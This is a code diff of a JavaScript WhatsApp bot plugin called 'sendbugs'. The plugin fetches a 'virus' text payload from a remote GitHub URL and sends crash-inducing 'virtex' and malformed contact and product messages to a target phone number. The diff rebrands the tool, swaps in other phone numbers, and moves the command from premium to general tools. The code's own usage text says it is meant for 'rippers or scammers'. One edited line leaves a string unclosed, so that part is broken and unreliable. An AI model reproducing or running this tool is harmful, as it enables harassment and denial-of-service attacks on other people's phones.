@@ -6,7 +6,7 @@ import { sticker } from '../lib/sticker.js'
 const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = pkg
 
 let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
-    if (global.db.data.users[m.sender].premiumTime < 1) return conn.sendButtonDoc(m.chat, `𝐅𝐈𝐓𝐔𝐑 𝐈𝐍𝐈 𝐊𝐇𝐔𝐒𝐔𝐒 𝐏𝐑𝐄𝐌𝐈𝐔𝐌!!`, botdate, '𝐁𝐮𝐲 𝐏𝐫𝐞𝗺𝐢𝐮𝗺', '.sewabot', m, adReply)
+    if (global.db.data.users[m.sender].premiumTime < 1) return conn.sendButtonDoc(m.chat, `FITUR INI BERBAHAYA !!`, botdate, ', m, adReply)
 	if (!text)return m.reply(`Contoh Penggunaan : *${_p + command}* <nomor>\n\n*Note :*\nGunaka Fitur Hanya Untuk Ripper Atau Scamer`)
 	let thumb = fs.readFileSync('./thumbnail.jpg')
 	let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
@@ -15,8 +15,8 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 
 	const from = m.key.remoteJid
 	//const participants = m.isGroup ? await groupMetadata.participants : ''
-	let packname = 'ArifzynDev'
-	let q = `Bug Tag From HyzerDev\n${text}`
+	let packname = '𝚂𝙷𝚄𝚁𝙰𝙽𝙱𝙾𝚃𝚉-𝙼𝙳'
+	let q = `Bug Tag From 𝚂𝙷𝚄𝚁𝙰𝙽𝙱𝙾𝚃𝚉-𝙼𝙳\n${text}`
 	let sections = [{
 		title: `Recoded by ${packname}`,
 		rows: [
@@ -149,9 +149,9 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			"firstImageId": 1,
 			"salePriceAmount1000": "10000000",
 			"retailerId": `${packname}`,
-			"url": "wa.me/62881037044211"
+			"url": "wa.me/6281271010619"
 		},
-			"businessOwnerJid": "62881037044211@s.whatsapp.net",
+			"businessOwnerJid": "6281271010619@s.whatsapp.net",
 		}
 	}), { userJid: m.chat, quoted: ftrolii })	
 	//=================================================//	
@@ -209,7 +209,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 			let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
 				"contactMessage": {
 					"vcard": "HAHaAhHAHAHA",
-					"displayName": `HyzerDev`,
+					"displayName": `𝚂𝙷𝚄𝚁𝙰𝙽𝙱𝙾𝚃𝚉-𝙼𝙳`,
 					"contextInfo": {
 						"forwardingScore": 3,
 						"isForwarded": true
@@ -250,7 +250,7 @@ let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participan
 }
 
 handler.help = ['sendbugs <nomer>']
-handler.tags = ['premium']
+handler.tags = ['tools']
 handler.command = /^((send)?(bugs?|virtex|virus))$/i
 
 export default handler
